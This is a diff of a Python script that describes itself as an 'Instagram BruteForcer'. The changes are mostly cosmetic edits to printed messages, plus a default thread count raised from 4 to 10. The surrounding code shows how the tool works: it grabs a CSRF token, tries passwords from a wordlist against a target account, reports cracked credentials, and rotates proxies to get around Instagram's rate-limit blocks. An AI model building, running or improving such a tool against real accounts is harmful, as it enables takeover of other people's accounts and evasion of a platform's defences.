@@ -83,7 +83,7 @@ def get_csrf():
     """
     global csrf_token
 
-    print(bcolors.WARNING + "[+] Getting CSRF Token: " + bcolors.ENDC)
+    print(bcolors.WARNING + "[+] Getting CSRF Token : " + bcolors.ENDC)
 
     try:
         opener = rq.build_opener(rq.HTTPHandler(), rq.HTTPSHandler())
@@ -108,7 +108,7 @@ def get_csrf():
         if _debug:
             logger.error(err)
 
-        print(bcolors.FAIL + "[!] Exiting..." + bcolors.ENDC)
+        print(bcolors.FAIL + "[!] Exiting . . ." + bcolors.ENDC)
         exit(3)
 
 
@@ -170,8 +170,8 @@ def brute(q):
             if sock.read().decode().find('"authenticated": true') != -1:
                 print(bcolors.OKGREEN + bcolors.BOLD + "\n[*]Successful Login:")
                 print("---------------------------------------------------")
-                print("[!]Username: ", USER)
-                print("[!]Password: ", word)
+                print("[!] Username : ", USER)
+                print("[!] Password : ", word)
                 print("---------------------------------------------------\n" + bcolors.ENDC)
                 found_flag = True
                 q.queue.clear()
@@ -183,8 +183,8 @@ def brute(q):
                     print(bcolors.OKGREEN + bcolors.BOLD + "\n[*]Successful Login "
                           + bcolors.FAIL + "But need Checkpoint :|" + bcolors.OKGREEN)
                     print("---------------------------------------------------")
-                    print("[!]Username: ", USER)
-                    print("[!]Password: ", word)
+                    print("[!]Username : ", USER)
+                    print("[!]Password : ", word)
                     print("---------------------------------------------------\n" + bcolors.ENDC)
                     found_flag = True
                     q.queue.clear()
@@ -192,12 +192,12 @@ def brute(q):
                     return
                 elif proxy:
                     print(bcolors.WARNING +
-                          "[!]Error: Proxy IP %s is now on Instagram jail ,  Removing from working list !" % (proxy,)
+                          "[!]Error : Proxy IP %s is now on Instagram jail ,  Removing from working list !" % (proxy,)
                           + bcolors.ENDC
                           )
                     if proxy in proxys_working_list:
                         proxys_working_list.pop(proxy)
-                    print(bcolors.OKGREEN + "[+] Online Proxy: ", str(len(proxys_working_list)) + bcolors.ENDC)
+                    print(bcolors.OKGREEN + "[+] Online Proxy : ", str(len(proxys_working_list)) + bcolors.ENDC)
                 else:
                     print(bcolors.FAIL + "[!]Error : Your Ip is now on Instagram jail ,"
                           " script will not work fine until you change your ip or use proxy" + bcolors.ENDC)
@@ -232,7 +232,7 @@ def starter():
     queuelock = threading.Lock()
 
     print(bcolors.HEADER + "\n[!] Initializing Workers")
-    print("[!] Start Cracking ... \n" + bcolors.ENDC)
+    print("[!] Start Cracking . . . \n" + bcolors.ENDC)
 
     try:
         for word in words:
@@ -263,7 +263,7 @@ def check_avalaible_proxys(proxys):
     socket.setdefaulttimeout(30)
 
     global proxys_working_list
-    print(bcolors.WARNING + "[-] Testing Proxy List...\n" + bcolors.ENDC)
+    print(bcolors.WARNING + "[-] Testing Proxy List . . .\n" + bcolors.ENDC)
 
     proxys_working_list = {}
     max_thread = THREAD
@@ -293,7 +293,7 @@ if __name__ == "__main__":
 
     parser = argparse.ArgumentParser(
         description="Instagram BruteForcer",
-        epilog="./instabrute -u user_test -w words.txt -p proxys.txt -t 4 -d -v"
+        epilog="./instabrute -u user_test -w wordlist.txt -p proxylist.txt -t 10 -d -v"
     )
 
     # required argument
@@ -304,7 +304,7 @@ if __name__ == "__main__":
     parser.add_argument('-p', '--proxy', action="store", required=True,
                         help='Proxy list path')
     # optional arguments
-    parser.add_argument('-t', '--thread', help='Thread', type=int, default=4)
+    parser.add_argument('-t', '--thread', help='Thread', type=int, default=10)
     parser.add_argument('-v', '--verbose', action='store_const', help='Thread', const=True, default=False)
     parser.add_argument('-d', '--debug', action='store_const', const=True, help='Debug mode', default=False)
 
@@ -327,13 +327,13 @@ if __name__ == "__main__":
     try:
         words = open(args.word).readlines()
     except IOError:
-        print("[-] Error: Check your word list file path\n")
+        print("[-] Error : Check your word list file path\n")
         sys.exit(1)
 
     try:
         proxys = open(args.proxy).readlines()
     except IOError:
-        print("[-] Error: Check your proxy list file path\n")
+        print("[-] Error : Check your proxy list file path\n")
         sys.exit(1)
 
     # enable debugging if its set
@@ -360,9 +360,9 @@ if __name__ == "__main__":
     print("""|  /facebook.com/bossy.078   /instagram.com/bossy.078   |""")
     print("""'-------------------------------------------------------'""")
 
-    print(bcolors.OKGREEN + "[+] Username Loaded:", bcolors.BOLD + USER + bcolors.ENDC)
-    print(bcolors.OKGREEN + "[+] Words Loaded:", bcolors.BOLD + str(len(words)) + bcolors.ENDC)
-    print(bcolors.OKGREEN + "[+] Proxy Loaded:", bcolors.BOLD + str(len(proxys)) + bcolors.ENDC)
+    print(bcolors.OKGREEN + "[+] Username Loaded :", bcolors.BOLD + USER + bcolors.ENDC)
+    print(bcolors.OKGREEN + "[+] Words Loaded :", bcolors.BOLD + str(len(words)) + bcolors.ENDC)
+    print(bcolors.OKGREEN + "[+] Proxy Loaded :", bcolors.BOLD + str(len(proxys)) + bcolors.ENDC)
     print(bcolors.ENDC)
 
     check_avalaible_proxys(proxys)
